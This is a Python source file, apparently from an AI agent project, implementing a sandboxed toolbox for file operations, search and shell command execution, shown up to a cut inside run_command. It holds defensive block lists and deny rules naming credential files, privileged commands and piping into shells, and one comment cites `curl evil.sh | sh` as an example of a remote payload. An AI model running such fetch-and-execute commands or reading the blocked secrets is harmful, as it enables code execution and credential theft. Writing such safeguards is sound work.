"""
Toolbox implementation — OS and OS-like capabilities for the agent.
Provides safe, whitelisted, and confirmed interface for file/OS operations.
"""

import asyncio
import base64
import ipaddress
import json
import mimetypes
import os
import re
import shutil
import socket
import subprocess
import urllib.parse
import uuid
from pathlib import Path
from typing import Any, Dict, List, Optional, Union
from loguru import logger
from datetime import datetime

from core.tool_defs import build_tool_definitions
from core.vectors import get_vector_service
from core.paths import PERSONA_DIR

_SENSITIVE_NAMES = frozenset(
    {
        "limebot.json",
        "package-lock.json",
        "config.py",
        "secrets.py",
        ".env",
        ".env.local",
        ".env.production",
    }
)
_SENSITIVE_EXTENSIONS = frozenset({".pem", ".key", ".p12", ".pfx"})
# Max bytes for remote downloads (send_media / fetch_url_to_temp).
_MAX_DOWNLOAD_BYTES = 15 * 1024 * 1024
_MAX_IMAGE_REFERENCE_BYTES = 50 * 1024 * 1024
_MAX_IMAGE_REFERENCES = 4
_IMAGE_REFERENCE_EXTENSIONS = frozenset({".png", ".jpg", ".jpeg", ".webp"})
_DOWNLOAD_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)
_OUTBOUND_FORBIDDEN_FILENAMES = frozenset(
    {
        "identity.md",
        "soul.md",
        "memory.md",
        ".env",
        "limebot.json",
        "id_rsa",
        "agents.md",
    }
)
_RG_EXCLUDE_GLOBS = (
    "!.git/**",
    "!node_modules/**",
    "!__pycache__/**",
    "!*.pyc",
    "!.env*",
    "!limebot.json",
    "!config.py",
    "!secrets.py",
    "!package-lock.json",
    "!*.pem",
    "!*.key",
    "!*.p12",
    "!*.pfx",
)


class Toolbox:
    """
    The Toolbox manages the agent's interaction with the external world.
    It provides a safe, whitelisted, and confirmed interface for file/OS operations.
    """

    def __init__(self, allowed_paths: List[str], bus: Any, config: Any):

        self.allowed_paths = [Path.cwd().resolve()]
        self.bus = bus
        self.config = config
        self.agent = None
        self.subagent_registry = None
        self.scheduler = None
        self.channels: List[Any] = []
        self.vector_service = get_vector_service(config)

        if allowed_paths:
            for p in allowed_paths:
                try:
                    path = Path(p).resolve()
                    if path not in self.allowed_paths:
                        self.allowed_paths.append(path)
                except Exception as e:
                    logger.warning(f"Could not add allowed path {p}: {e}")

        self.blocked_files = {
            ".env",
            "limebot.json",
            ".git",
            "__pycache__",
            "node_modules",
        }
        try:
            from core.video.service import sweep_expired_jobs

            sweep_expired_jobs()
        except Exception as exc:
            logger.debug(f"Video temp cleanup skipped: {exc}")

    def set_agent(self, agent: Any):
        """Set the agent loop instance."""
        self.agent = agent

    async def analyze_video(
        self,
        source: str,
        question: str = "",
        detail: str = "balanced",
        start: Optional[str] = None,
        end: Optional[str] = None,
        max_frames: Optional[int] = None,
        resolution: int = 512,
    ) -> str:
        """Delegate to the optional native video pipeline."""
        from core.video import analyze_video

        video_config = getattr(self.config, "video", None)
        return await analyze_video(
            source=source,
            question=question,
            detail=detail,
            start=start,
            end=end,
            max_frames=max_frames,
            resolution=resolution,
            is_path_allowed=self._is_path_allowed,
            whisper_enabled=bool(getattr(video_config, "whisper_enabled", False)),
            openai_api_key=os.getenv("OPENAI_API_KEY", "").strip(),
        )

    def set_scheduler(self, scheduler: Any):
        """Set the scheduler instance."""
        self.scheduler = scheduler

    def set_subagent_registry(self, registry: Any):
        """Set the subagent registry used to enrich delegation tools."""
        self.subagent_registry = registry

    def set_channels(self, channels: List[Any]):
        """Expose live channel instances for channel-native tools."""
        self.channels = list(channels or [])

    def _detect_skill_path(self, command: str):
        """Best-effort detection of a skill directory from a command string."""
        match = re.search(r"skills[\\/](?P<name>[^\\/\\s]+)", command)
        if not match:
            return None

        name = match.group("name")
        return {"name": name, "path": Path("skills") / name}

    @staticmethod
    def _preferred_python_executable() -> str:
        """Prefer the project's venv Python when available, then fall back to the running interpreter."""
        import sys as _sys

        candidates = []
        cwd = Path.cwd().resolve()
        if os.name == "nt":
            candidates.extend(
                [
                    cwd / ".venv" / "Scripts" / "python.exe",
                    cwd / "venv" / "Scripts" / "python.exe",
                ]
            )
        else:
            candidates.extend(
                [
                    cwd / ".venv" / "bin" / "python",
                    cwd / "venv" / "bin" / "python",
                ]
            )

        running = Path(_sys.executable).resolve()
        for candidate in candidates:
            try:
                if candidate.exists():
                    return str(candidate)
            except Exception:
                continue
        return str(running)

    @staticmethod
    def _windows_browser_binary(browser_name: str) -> Optional[Path]:
        candidates = {
            "opera": [
                Path.home() / "AppData" / "Local" / "Programs" / "Opera GX" / "opera.exe",
                Path.home() / "AppData" / "Local" / "Programs" / "Opera" / "opera.exe",
            ],
            "msedge": [
                Path(r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"),
                Path(r"C:\Program Files\Microsoft\Edge\Application\msedge.exe"),
            ],
            "chrome": [
                Path(r"C:\Program Files\Google\Chrome\Application\chrome.exe"),
                Path(r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"),
                Path.home()
                / "AppData"
                / "Local"
                / "Google"
                / "Chrome"
                / "Application"
                / "chrome.exe",
            ],
        }
        for candidate in candidates.get(browser_name, []):
            if candidate.exists():
                return candidate
        return None

    @staticmethod
    def _is_local_port_in_use(port: int) -> bool:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(0.25)
            return sock.connect_ex(("127.0.0.1", port)) == 0

    @staticmethod
    def _extract_remote_debug_port(command: str) -> Optional[int]:
        match = re.search(
            r"--remote-debugging-port=(\d+)", command or "", re.IGNORECASE
        )
        return int(match.group(1)) if match else None

    @staticmethod
    def _is_windows_process_running(image_name: str) -> bool:
        if os.name != "nt":
            return False
        try:
            result = subprocess.run(
                ["tasklist", "/FI", f"IMAGENAME eq {image_name}", "/FO", "CSV", "/NH"],
                capture_output=True,
                text=True,
                timeout=5,
            )
        except Exception:
            return False
        output = (result.stdout or "").strip().lower()
        return bool(output and "no tasks are running" not in output and image_name.lower() in output)

    def _normalize_browser_launch_command(
        self, command: str
    ) -> tuple[str, Optional[str]]:
        stripped = (command or "").strip()
        lowered = stripped.lower()
        if os.name != "nt" or "--remote-debugging-port=" not in lowered:
            return command, None

        match = re.search(r"--remote-debugging-port=(\d+)", stripped, re.IGNORECASE)
        port = int(match.group(1)) if match else 9222

        browser_name = None
        if re.match(r"^(?:start\s+)?opera(?:\s|$)", lowered):
            browser_name = "opera"
        elif re.match(r"^(?:start\s+)?msedge(?:\s|$)", lowered):
            browser_name = "msedge"
        elif re.match(r"^(?:start\s+)?chrome(?:\s|$)", lowered):
            browser_name = "chrome"

        if not browser_name:
            return command, None

        if self._is_local_port_in_use(port):
            return (
                command,
                f"Error: Port {port} is already in use. Close the browser currently exposing that CDP port or choose a different port before launching {browser_name}.",
            )

        if browser_name == "opera" and "--user-data-dir=" not in lowered:
            if self._is_windows_process_running("opera.exe"):
                return (
                    command,
                    "Error: Opera is already running. Close all Opera windows before launching it with --remote-debugging-port if you want LimeBot to attach to that session.",
                )

        browser_binary = self._windows_browser_binary(browser_name)
        if not browser_binary:
            return (
                command,
                f"Error: Could not find a local {browser_name} binary to launch with remote debugging.",
            )

        normalized = re.sub(
            r"^(?:start\s+)?(?:opera|msedge|chrome)\b",
            lambda _match: f'"{browser_binary}"',
            stripped,
            count=1,
            flags=re.IGNORECASE,
        )
        return normalized, None

    @staticmethod
    def _is_browser_remote_debug_launch(command: str) -> bool:
        lowered = (command or "").lower()
        return "--remote-debugging-port=" in lowered and any(
            token in lowered for token in ("opera.exe", "msedge.exe", "chrome.exe")
        )

    @staticmethod
    def _has_unquoted_semicolon(command: str) -> bool:
        """Return True when a semicolon can act as a shell command separator."""
        in_single = False
        in_double = False
        escaped = False

        for char in command or "":
            if escaped:
                escaped = False
                continue
            if char == "\\":
                escaped = True
                continue
            if char == "'" and not in_double:
                in_single = not in_single
                continue
            if char == '"' and not in_single:
                in_double = not in_double
                continue
            if char == ";" and not in_single and not in_double:
                return True
        return False

    async def send_progress(self, message: str):
        """Broadcast tool progress if an agent/bus is available."""
        if self.agent and hasattr(self.agent, "send_tool_progress"):
            from core.context import tool_context

            ctx = tool_context.get()
            if ctx and "tc_id" in ctx:
                await self.agent.send_tool_progress(
                    ctx["tc_id"], ctx.get("chat_id", "system"), message
                )
        logger.info(f"🛠️ Tool Progress: {message}")

    def get_tool_definitions(self) -> List[Dict[str, Any]]:
        """Return the tool definitions based on the current config."""
        enabled_skills = []
        if self.config:
            if hasattr(self.config, "skills") and hasattr(
                self.config.skills, "enabled"
            ):
                enabled_skills = self.config.skills.enabled
            elif isinstance(self.config, dict) and "skills" in self.config:
                enabled_skills = self.config["skills"].get("enabled", [])

        available_agents = {}
        if self.subagent_registry is not None:
            try:
                available_agents = self.subagent_registry.get_agent_descriptions()
            except Exception as e:
                logger.warning(f"Failed to read subagent registry: {e}")

        # Search tools are available when a search API key is configured
        # (browser-skill enablement is handled inside build_tool_definitions).
        search_available = False
        try:
            from core.web_search import search_api_configured

            search_available = search_api_configured(self.config)
        except Exception:
            search_available = False

        # Base tools from tool_defs.py
        tools = build_tool_definitions(
            enabled_skills,
            available_agents=available_agents,
            search_available=search_available,
        )

        # Load MCP tools dynamically
        try:
            from core.mcp_client import get_mcp_manager

            mcp_tools = get_mcp_manager().get_tools()
            for mt in mcp_tools:
                tools.append(mt)
                logger.debug(f"Registered MCP tool: {mt['function']['name']}")
        except Exception as e:
            logger.warning(f"Failed to load MCP tools: {e}")

        return tools

    def _is_path_allowed(self, path_str: Union[str, Path]) -> bool:
        """Enforce whitelist and block sensitive files."""
        try:
            target_path = Path(path_str).resolve()
            name = target_path.name.lower()

            if (
                name in _SENSITIVE_NAMES
                or name in self.blocked_files
                or name.startswith(".env")
                or target_path.suffix.lower() in _SENSITIVE_EXTENSIONS
            ):
                return False

            for allowed in self.allowed_paths:
                if target_path == allowed or allowed in target_path.parents:
                    return True
            return False
        except Exception:
            return False

    @staticmethod
    def _to_display_path(path: Path) -> str:
        """Prefer project-relative paths in tool responses."""
        try:
            return str(path.resolve().relative_to(Path.cwd().resolve()))
        except Exception:
            return str(path.resolve())

    def _format_search_results(self, rows: List[Dict[str, Any]], query: str) -> str:
        if not rows:
            return json.dumps({"query": query, "matches": []})

        formatted_rows = []
        for row in rows:
            path = row.get("path", "unknown")
            line = row.get("line")
            text = (row.get("text") or "").replace("\t", " ").strip()
            if len(text) > 220:
                text = text[:220] + "..."
            formatted_rows.append({"path": path, "line": line, "text": text})

        return json.dumps({"query": query, "matches": formatted_rows})

    @staticmethod
    def _slice_text_for_read(
        text: str,
        max_chars: int,
        start_line: Optional[int] = None,
        end_line: Optional[int] = None,
    ) -> str:
        """Apply optional line slicing + char truncation to extracted text."""
        if start_line is not None or end_line is not None:
            lines = text.splitlines(keepends=True)
            start_idx = max((start_line or 1) - 1, 0)
            end_idx = end_line if end_line is not None else len(lines)
            text = "".join(lines[start_idx:end_idx])

        if len(text) > max_chars:
            return text[:max_chars] + f"\n... (Truncated at {max_chars} chars)"
        return text

    def _get_channel_by_name(self, channel_name: str) -> Any | None:
        for channel in self.channels:
            if getattr(channel, "name", "") == channel_name:
                return channel
        return None

    def _is_path_shareable(self, path_str: Union[str, Path]) -> tuple[bool, str | None, Path | None]:
        """Validate whether a file is safe to send back to a user."""
        if not self._is_path_allowed(path_str):
            return False, f"Access denied to path '{path_str}'.", None

        try:
            p = Path(path_str).resolve()
        except Exception:
            return False, f"Invalid path '{path_str}'.", None

        if not p.exists():
            return False, f"File '{path_str}' does not exist.", None
        if not p.is_file():
            return False, f"'{path_str}' is not a file.", None

        lowered_name = p.name.lower()
        if lowered_name in _OUTBOUND_FORBIDDEN_FILENAMES or lowered_name.startswith(".env"):
            return False, f"Blocked sensitive file '{p.name}'.", None
        if "persona" in {part.lower() for part in p.parts}:
            return False, "Blocked files inside the persona directory.", None

        return True, None, p

    @staticmethod
    def _extract_docx_text(path: Path) -> str:
        """Extract paragraph and table text from a DOCX file."""
        try:
            from docx import Document
        except Exception as e:
            raise RuntimeError(
                "DOCX support requires 'python-docx'. Install dependencies and retry."
            ) from e

        doc = Document(str(path))
        chunks: List[str] = []

        for paragraph in doc.paragraphs:
            text = paragraph.text.strip()
            if text:
                chunks.append(text)

        for table in doc.tables:
            for row in table.rows:
                cells = [cell.text.strip() for cell in row.cells if cell.text.strip()]
                if cells:
                    chunks.append(" | ".join(cells))

        if chunks:
            return "\n".join(chunks)
        return "No extractable text found in DOCX."

    @staticmethod
    def _extract_pdf_text(path: Path) -> str:
        """Extract text from each page of a PDF."""
        try:
            from pypdf import PdfReader
        except Exception as e:
            raise RuntimeError(
                "PDF support requires 'pypdf'. Install dependencies and retry."
            ) from e

        reader = PdfReader(str(path))
        if reader.is_encrypted:
            try:
                reader.decrypt("")
            except Exception as e:
                raise RuntimeError(
                    "PDF is encrypted and cannot be read without a password."
                ) from e

        chunks: List[str] = []
        for idx, page in enumerate(reader.pages, start=1):
            try:
                page_text = (page.extract_text() or "").strip()
            except Exception as e:
                logger.warning(f"Failed extracting text from PDF page {idx}: {e}")
                continue
            if page_text:
                chunks.append(f"[Page {idx}]\n{page_text}")

        if chunks:
            return "\n\n".join(chunks)
        return "No extractable text found in PDF."

    async def read_file(
        self,
        path: str,
        max_chars: int = 20_000,
        start_line: int = None,
        end_line: int = None,
    ) -> str:
        """
        Read file contents with optional line-range slicing.
        Uses bounded reads to avoid loading huge files into memory.
        """
        if not self._is_path_allowed(path):
            return f"Error: Access denied to path '{path}'."
        p = Path(path).resolve()
        if not p.exists():
            return f"Error: File '{path}' does not exist."
        if not p.is_file():
            return f"Error: '{path}' is a directory."
        try:
            try:
                max_chars = int(max_chars)
            except Exception:
                max_chars = 20_000
            max_chars = max(200, min(max_chars, 200_000))

            has_range = start_line is not None or end_line is not None
            if has_range:
                if start_line is None:
                    start_line = 1
                try:
                    start_line = int(start_line)
                    end_line = int(end_line) if end_line is not None else None
                except Exception:
                    return "Error: start_line/end_line must be integers."

                if start_line < 1:
                    return "Error: start_line must be >= 1."
                if end_line is not None and end_line < start_line:
                    return "Error: end_line must be >= start_line."

            if p.suffix.lower() in {".docx", ".pdf"}:
                def _read_rich_document() -> str:
                    if p.suffix.lower() == ".docx":
                        extracted = Toolbox._extract_docx_text(p)
                    else:
                        extracted = Toolbox._extract_pdf_text(p)
                    return Toolbox._slice_text_for_read(
                        extracted,
                        max_chars=max_chars,
                        start_line=start_line,
                        end_line=end_line,
                    )

                return await asyncio.to_thread(_read_rich_document)

            if has_range:
                def _read_line_range() -> str:
                    collected: List[str] = []
                    total = 0
                    truncated = False

                    with open(p, "r", encoding="utf-8", errors="replace") as f:
                        for idx, line in enumerate(f, start=1):
                            if idx < start_line:
                                continue
                            if end_line is not None and idx > end_line:
                                break

                            if total + len(line) > max_chars:
                                remaining = max_chars - total
                                if remaining > 0:
                                    collected.append(line[:remaining])
                                truncated = True
                                break

                            collected.append(line)
                            total += len(line)

                    output = "".join(collected)
                    if truncated:
                        output += f"\n... (Truncated at {max_chars} chars)"
                    return output

                return await asyncio.to_thread(_read_line_range)

            def _read_bounded() -> str:
                with open(p, "r", encoding="utf-8", errors="replace") as f:
                    chunk = f.read(max_chars + 1)
                if len(chunk) > max_chars:
                    return chunk[:max_chars] + f"\n... (Truncated at {max_chars} chars)"
                return chunk

            return await asyncio.to_thread(_read_bounded)
        except Exception as e:
            return f"Error reading file: {e}"

    async def write_file(self, path: str, content: str) -> str:
        """Write content to a file."""
        if not self._is_path_allowed(path):
            return f"Error: Access denied to path '{path}'."
        p = Path(path).resolve()
        try:
            resolved_persona = PERSONA_DIR.resolve()
            if p == resolved_persona or resolved_persona in p.parents:
                return (
                    "Error: Direct modification of state-managed files under 'persona/' is blocked. "
                    "Please use the appropriate XML tags to update your persona, mood, relationship, memories, or user profiles "
                    "(e.g., <save_soul>, <save_identity>, <save_mood>, <save_relationship>, <save_memory>, <log_memory>, or <save_user>)."
                )
        except Exception as e:
            logger.error(f"Error checking persona path safety: {e}")

        try:
            await asyncio.to_thread(p.parent.mkdir, parents=True, exist_ok=True)
            await asyncio.to_thread(p.write_text, content, encoding="utf-8")
            return f"Successfully wrote to '{path}'."
        except Exception as e:
            return f"Error writing file: {e}"

    async def delete_file(self, path: str) -> str:
        """Delete a file or directory."""
        if not self._is_path_allowed(path):
            return f"Error: Access denied to path '{path}'."
        p = Path(path).resolve()
        try:
            resolved_persona = PERSONA_DIR.resolve()
            if p == resolved_persona or resolved_persona in p.parents:
                return (
                    "Error: Direct deletion of state-managed files under 'persona/' is blocked. "
                    "Please use the appropriate XML tags to manage your state."
                )
        except Exception as e:
            logger.error(f"Error checking persona path safety: {e}")

        if not p.exists():
            return f"Error: Path '{path}' does not exist."
        try:
            if p.is_file():
                await asyncio.to_thread(p.unlink)
            elif p.is_dir():
                await asyncio.to_thread(shutil.rmtree, p)
            return f"Successfully deleted '{path}'."
        except Exception as e:
            return f"Error deleting: {e}"

    async def list_dir(
        self,
        path: str = ".",
        limit: int = 200,
        offset: int = 0,
        include_hidden: bool = False,
        sort_by: str = "name",
        descending: bool = False,
        folders_first: bool = True,
    ) -> str:
        """
        List files in a directory with pagination and configurable sorting.
        Uses os.scandir/os.walk-style traversal semantics for lower overhead.
        """
        if not self._is_path_allowed(path):
            return f"Error: Access denied to path '{path}'."
        p = Path(path).resolve()
        if not p.exists():
            return f"Error: Directory '{path}' does not exist."
        if not p.is_dir():
            return f"Error: Path '{path}' is not a directory."
        try:
            try:
                limit = int(limit)
            except Exception:
                limit = 200
            limit = max(1, min(limit, 1000))

            try:
                offset = int(offset)
            except Exception:
                offset = 0
            offset = max(0, offset)

            sort_by = (sort_by or "name").strip().lower()
            if sort_by not in {"name", "type", "mtime", "size", "none"}:
                return "Error: sort_by must be one of: name, type, mtime, size, none."

            def _scan_dir() -> List[Dict[str, Any]]:
                entries: List[Dict[str, Any]] = []
                with os.scandir(p) as it:
                    for entry in it:
                        name = entry.name
                        if not include_hidden and name.startswith("."):
                            continue

                        try:
                            is_dir = entry.is_dir(follow_symlinks=False)
                        except Exception:
                            is_dir = False

                        rec: Dict[str, Any] = {"name": name, "is_dir": is_dir}

                        if sort_by in {"mtime", "size"}:
                            try:
                                st = entry.stat(follow_symlinks=False)
                                rec["mtime"] = st.st_mtime
                                rec["size"] = 0 if is_dir else st.st_size
                            except Exception:
                                rec["mtime"] = 0
                                rec["size"] = 0

                        entries.append(rec)
                return entries

            entries = await asyncio.to_thread(_scan_dir)

            def _key_for(rec: Dict[str, Any]):
                if sort_by == "mtime":
                    return rec.get("mtime", 0)
                if sort_by == "size":
                    return rec.get("size", 0)
                return rec["name"].lower()

            if sort_by == "type":
                entries.sort(
                    key=lambda r: (0 if r["is_dir"] else 1, r["name"].lower()),
                    reverse=descending,
                )
            elif sort_by != "none":
                if folders_first:
                    dirs = [r for r in entries if r["is_dir"]]
                    files = [r for r in entries if not r["is_dir"]]
                    dirs.sort(key=_key_for, reverse=descending)
                    files.sort(key=_key_for, reverse=descending)
                    entries = dirs + files
                else:
                    entries.sort(key=_key_for, reverse=descending)
            elif folders_first:
                dirs = [r for r in entries if r["is_dir"]]
                files = [r for r in entries if not r["is_dir"]]
                entries = dirs + files

            total = len(entries)
            page = entries[offset : offset + limit]

            if not page:
                return f"No entries in page (offset={offset}, total={total})."

            start = offset + 1
            end = offset + len(page)
            header = f"Listing '{self._to_display_path(p)}' ({start}-{end} of {total})"
            if end < total:
                header += f" — more entries available (next offset: {end})"

            lines = [header]
            for rec in page:
                type_str = "DIR" if rec["is_dir"] else "FILE"
                lines.append(f"[{type_str}] {rec['name']}")

            return "\n".join(lines)
        except Exception as e:
            return f"Error listing directory: {e}"

    async def search_files(
        self,
        query: str,
        path: str = ".",
        file_glob: str = "*",
        mode: str = "content",
        case_sensitive: bool = False,
        max_results: int = 40,
    ) -> str:
        """
        Fast project search for file names or file content.
        Uses ripgrep when available, with a safe Python fallback.
        """
        query = (query or "").strip()
        if not query:
            return "Error: 'query' is required."
        if len(query) > 256:
            return "Error: query is too long (max 256 chars)."

        mode = (mode or "content").strip().lower()
        if mode not in {"content", "name"}:
            return "Error: mode must be either 'content' or 'name'."

        try:
            max_results = max(1, min(int(max_results), 200))
        except Exception:
            max_results = 40

        if not self._is_path_allowed(path):
            return f"Error: Access denied to path '{path}'."

        root = Path(path).resolve()
        if not root.exists():
            return f"Error: Path '{path}' does not exist."

        try:
            if mode == "name":
                rows = await asyncio.to_thread(
                    self._search_file_names_sync,
                    root,
                    query,
                    file_glob,
                    case_sensitive,
                    max_results,
                )
            else:
                rows = await asyncio.to_thread(
                    self._search_file_content_sync,
                    root,
                    query,
                    file_glob,
                    case_sensitive,
                    max_results,
                )
            return self._format_search_results(rows, query)
        except Exception as e:
            return f"Error searching files: {e}"

    def _search_file_names_sync(
        self,
        root: Path,
        query: str,
        file_glob: str,
        case_sensitive: bool,
        max_results: int,
    ) -> List[Dict[str, Any]]:
        """Sync helper for filename search."""
        if not root.is_dir():
            if root.is_file() and self._is_path_allowed(root):
                name = root.name
                hit = query in name if case_sensitive else query.lower() in name.lower()
                if hit:
                    return [
                        {"path": self._to_display_path(root), "line": None, "text": ""}
                    ]
            return []

        q = query if case_sensitive else query.lower()
        rows: List[Dict[str, Any]] = []

        for dirpath, dirnames, filenames in os.walk(root):
            dirnames[:] = [
                d
                for d in dirnames
                if d
                not in {
                    ".git",
                    "node_modules",
                    "__pycache__",
                    ".venv",
                    "venv",
                    "env",
                    ".mypy_cache",
                    ".vercel",
                    ".next",
                    ".idea",
                    ".vscode",
                }
            ]
            for filename in filenames:
                if len(rows) >= max_results:
                    break
                file_path = Path(dirpath) / filename
                if file_glob and file_glob != "*" and not file_path.match(file_glob):
                    continue
                if not self._is_path_allowed(file_path):
                    continue
                hay = filename if case_sensitive else filename.lower()
                if q in hay:
                    rows.append(
                        {
                            "path": self._to_display_path(file_path),
                            "line": None,
                            "text": "",
                        }
                    )
            if len(rows) >= max_results:
                break
        return rows

    def _search_file_content_sync(
        self,
        root: Path,
        query: str,
        file_glob: str,
        case_sensitive: bool,
        max_results: int,
    ) -> List[Dict[str, Any]]:
        """Sync helper for content search; prefers ripgrep for speed."""
        rg_bin = shutil.which("rg")
        if rg_bin:
            try:
                import subprocess

                cmd = [
                    rg_bin,
                    "--json",
                    "--line-number",
                    "--color",
                    "never",
                    "--max-count",
                    "3",
                ]
                if not case_sensitive:
                    cmd.append("-i")
                if file_glob and file_glob != "*":
                    cmd.extend(["-g", file_glob])
                for g in _RG_EXCLUDE_GLOBS:
                    cmd.extend(["-g", g])
                cmd.extend(["--", query, str(root)])

                completed = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    encoding="utf-8",
                    errors="replace",
                    timeout=20,
                )

                # ripgrep exit codes: 0=matches, 1=no matches, >1 error
                if completed.returncode not in (0, 1):
                    raise RuntimeError(completed.stderr.strip() or "ripgrep failed")

                rows: List[Dict[str, Any]] = []
                for line in completed.stdout.splitlines():
                    if len(rows) >= max_results:
                        break
                    try:
                        payload = json.loads(line)
                    except Exception:
                        continue
                    if payload.get("type") != "match":
                        continue
                    data = payload.get("data", {})
                    path_text = (
                        data.get("path", {}).get("text")
                        or data.get("path", {}).get("bytes")
                        or ""
                    )
                    if not path_text:
                        continue
                    file_path = Path(path_text).resolve()
                    if not self._is_path_allowed(file_path):
                        continue

                    row_text = (data.get("lines", {}).get("text") or "").rstrip("\n")
                    rows.append(
                        {
                            "path": self._to_display_path(file_path),
                            "line": data.get("line_number"),
                            "text": row_text,
                        }
                    )
                return rows
            except Exception as e:
                logger.debug(f"search_files ripgrep path failed; falling back: {e}")

        # Fallback: Python scan
        rows: List[Dict[str, Any]] = []
        q = query if case_sensitive else query.lower()

        if root.is_file():
            candidates = [root]
        else:
            candidates = []
            for dirpath, dirnames, filenames in os.walk(root):
                dirnames[:] = [
                    d
                    for d in dirnames
                    if d
                    not in {
                        ".git",
                        "node_modules",
                        "__pycache__",
                        ".venv",
                        "venv",
                        "env",
                        ".mypy_cache",
                        ".vercel",
                        ".next",
                        ".idea",
                        ".vscode",
                    }
                ]
                for filename in filenames:
                    p = Path(dirpath) / filename
                    if file_glob and file_glob != "*" and not p.match(file_glob):
                        continue
                    candidates.append(p)

        for file_path in candidates:
            if len(rows) >= max_results:
                break
            try:
                if not file_path.is_file() or not self._is_path_allowed(file_path):
                    continue

                # Skip files larger than 5MB to prevent stalling
                try:
                    if file_path.stat().st_size > 5_000_000:
                        continue
                except Exception:
                    pass

                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    for idx, line in enumerate(f, start=1):
                        hay = line if case_sensitive else line.lower()
                        if q in hay:
                            rows.append(
                                {
                                    "path": self._to_display_path(file_path),
                                    "line": idx,
                                    "text": line.rstrip("\n"),
                                }
                            )
                            break
                        if len(rows) >= max_results:
                            break
            except Exception:
                continue
        return rows

    @staticmethod
    def _sanitized_env() -> dict:
        """Return a copy of the process environment with secrets stripped.

        ``config.py`` injects provider credentials into ``os.environ`` for
        legitimate in-process consumers (LiteLLM, vector embeddings, browser
        tooling). Subprocesses spawned by ``run_command`` inherit the full
        environment by default, so an approved-by-mistake ``env``/``printenv``
        would exfiltrate every key. Drop anything that looks like a secret
        while preserving PATH/HOME/TMPDIR and other benign vars.
        """
        secret_suffixes = ("API_KEY", "_TOKEN", "_SECRET", "PASSWORD", "APIKEY")
        sanitized = {}
        for key, value in os.environ.items():
            upper = key.upper()
            if any(upper.endswith(suffix) for suffix in secret_suffixes):
                continue
            sanitized[key] = value
        return sanitized

    async def run_command(self, command: str) -> str:
        """Execute a terminal command with real-time progress updates."""
        forbidden_regex = r"(\$\(|\`|&&|\|\||>|<|\n)"
        pseudo_call_match = re.match(
            r"^\s*([A-Za-z_][\w\.]*)\s*\((.*)\)\s*$", str(command or ""), re.DOTALL
        )

        unsafe_allowed = False
        if self.config:
            unsafe_allowed = getattr(self.config, "allow_unsafe_commands", False)

        if pseudo_call_match:
            call_name = pseudo_call_match.group(1)
            return (
                f"Error: '{call_name}(...)' looks like a pseudo tool or skill-manual example, "
                "not a shell command. SKILL.md examples are documentation only. "
                "Use an explicit CLI command with run_command instead, such as "
                "`python skills/<skill>/main.py ...`."
            )

        if not unsafe_allowed and re.search(forbidden_regex, command):
            match = re.search(forbidden_regex, command).group(0)
            return f"Error: Command contains forbidden character/sequence '{match}'. Enable 'Allow Unsafe Commands' in Config to bypass this restriction."

        if not unsafe_allowed and self._has_unquoted_semicolon(command):
            return "Error: Command contains forbidden character/sequence ';'. Enable 'Allow Unsafe Commands' in Config to bypass this restriction."

        # The forbidden_regex intentionally permits a bare pipe `|` so legitimate
        # flows like `... | grep` / `... | head` keep working. That same pipe,
        # however, enables `curl evil.sh | sh`, turning a fetched payload into
        # arbitrary code execution. Block piping into interpreters/executors
        # specifically while leaving text filters untouched.
        if not unsafe_allowed and re.search(
            r"\|\s*(sh|bash|zsh|dash|ksh|fish|python[0-9.]*|perl|ruby|node|xargs)\b",
            command,
        ):
            return (
                "Error: Piping command output directly into an interpreter "
                "(e.g. '| sh', '| bash', '| python') is blocked to prevent "
                "remote code execution. Download and inspect the script first, "
                "or enable 'Allow Unsafe Commands' in Config."
            )

        lowered_command = command.lower()
        if any(f in lowered_command for f in ["ifs=", "pythonpath="]):
            return "Error: Command or environment manipulation forbidden."

        if not unsafe_allowed and any(
            f in lowered_command for f in ["sudo", "chmod", "chown"]
        ):
            return (
                "Error: Privileged commands are blocked. "
                "Enable 'Allow Unsafe Commands' in Config to allow them."
            )

        try:
            command, browser_launch_error = self._normalize_browser_launch_command(command)
            if browser_launch_error:
                return browser_launch_error

            # Rewrite bare pip/python commands to use the running interpreter
            # so packages always install into the correct venv.
            _this_python = self._preferred_python_executable()
            _rewrites = [
                ("pip install ", f'"{_this_python}" -m pip install '),
                ("pip3 install ", f'"{_this_python}" -m pip install '),
                ("pip uninstall ", f'"{_this_python}" -m pip uninstall '),
                ("pip3 uninstall ", f'"{_this_python}" -m pip uninstall '),
                ("python3 ", f'"{_this_python}" '),
                ("python ", f'"{_this_python}" '),
            ]
            for _old, _new in _rewrites:
                if command.startswith(_old) or command.startswith(_old.capitalize()):
                    command = _new + command[len(_old) :]
                    break

            await self.send_progress(f"💻 Running: {command}")

            import os
            import time as _time

            if self._is_browser_remote_debug_launch(command):
                port = self._extract_remote_debug_port(command) or 9222
                creationflags = 0
                if os.name == "nt":
                    creationflags = (
                        subprocess.DETACHED_PROCESS
                        | subprocess.CREATE_NEW_PROCESS_GROUP
                    )

                subprocess.Popen(
                    command,
                    shell=True,
                    cwd=str(self.allowed_paths[0]),
                    stdin=subprocess.DEVNULL,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    creationflags=creationflags,
                    close_fds=True,
                    env=self._sanitized_env(),
                )

                deadline = _time.monotonic() + 10
                while _time.monotonic() < deadline:
                    if self._is_local_port_in_use(port):
                        return (
                            f"Success: Browser launched for CDP attach on "
                            f"http://127.0.0.1:{port}"
                        )
                    await asyncio.sleep(0.25)

                return (
                    f"Error: Browser launch command was started, but CDP port {port} "
                    "did not become available within 10 seconds."
                )

            kwargs = {
                "stdout": asyncio.subprocess.PIPE,
                "stderr": asyncio.subprocess.PIPE,
                "cwd": str(self.allowed_paths[0]),
                "env": self._sanitized_env(),
            }
            if os.name == "nt":
                kwargs["creationflags"] = subprocess.CREATE_NO_WINDOW

            process = await asyncio.create_subprocess_shell(command, **kwargs)

            full_output = []
            last_activity = _time.monotonic()
            stall_detected = False
            STALL_TIMEOUT = 0
            if self.config:
                try:
                    STALL_TIMEOUT = float(getattr(self.config, "stall_timeout", 0))
                except (ValueError, TypeError):
                    pass

